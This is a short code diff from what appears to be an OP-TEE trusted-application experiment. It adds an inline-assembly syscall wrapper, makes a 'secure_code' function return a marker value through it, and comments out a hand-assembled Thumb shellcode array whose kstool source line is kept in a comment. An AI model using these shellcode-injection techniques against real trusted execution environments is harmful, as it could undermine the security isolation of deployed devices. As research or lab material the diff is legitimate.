@@ -35,9 +35,23 @@
 /* To the the UUID (found the the TA's h-file(s)) */
 #include <hello_blob_ta.h>
 
+void utee_return(unsigned long ret) __attribute__((noreturn));
+
+void utee_return(unsigned long ret){
+	asm volatile (
+			"push {r5-r7, lr}\n"
+			"mov r7, #0\n"
+			"mov r6, #0\n"
+			"svc 0\n"
+			"pop {r5-r7, pc}\n"
+			::: "r5","r6","r7", "lr"
+			);
+}
+
 __attribute__((section(".secure_code"))) int foo()
 {
-	return 1;
+	utee_return(0x13376047);
+	// return 0x13376047;
 }
 
 
@@ -49,7 +63,7 @@ int main(int argc, char *argv[])
 	// unsigned char shellcode[] = {0x80, 0xea, 0x00, 0x00, 0x00, 0x4f, 0x00, 0xdf, 0x01, 0x00, 0x00, 0x00};
 	// kstool thumb "$(echo "ldr r3, =0x133760A7\n blx r3\n eor r0,r0\nldr r7, =0x1\nswi 0")" 0
 	// 02 4b 98 47 80 ea 00 00 01 4f 00 df a7 60 37 13 01 00 00 00
-	unsigned char shellcode[] = {0x02, 0x4b, 0x98, 0x47, 0x80, 0xea, 0x00, 0x00, 0x01, 0x4f, 0x00, 0xdf, 0xa7, 0x60, 0x37, 0x13, 0x01, 0x00, 0x00, 0x00};
+	// unsigned char shellcode[] = {0x02, 0x4b, 0x98, 0x47, 0x80, 0xea, 0x00, 0x00, 0x01, 0x4f, 0x00, 0xdf, 0xa7, 0x60, 0x37, 0x13, 0x01, 0x00, 0x00, 0x00};
 
 	TEEC_Result res;
 	TEEC_Context ctx;
